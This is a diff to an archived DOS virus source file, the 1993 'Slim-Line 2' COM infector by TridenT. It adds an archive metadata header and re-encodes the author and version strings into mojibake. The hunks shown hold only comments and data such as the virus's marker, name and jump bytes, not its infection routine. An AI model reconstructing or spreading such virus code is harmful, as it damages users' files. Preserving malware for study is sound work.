@@ -1,6 +1,17 @@
+; ------------------------------------------------------------
+; name      S
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;
 ; The Slim-Line 2 virus, from the Slim-line virus collection.
-; (C) 1993 by [DàRkRàY]/TridenT
+; (C) 1993 by [Dï¿½RkRï¿½Y]/TridenT
 ;
 ; And this time it's a direct action COM infector.
 ;  <will be commented soon>
@@ -137,7 +148,7 @@ SET_POINTER:
 
         CUT             DB      ""
         MARKER          DB      "[DR/TridenT]"
-        NAMED           DB      "Slim-Line 2 v0.9á"
+        NAMED           DB      "Slim-Line 2 v0.9ï¿½"
         COUNTRY         DB      "Holland"
         NEW_4_BYTES     DB      'D', 0E9h
 LAST:
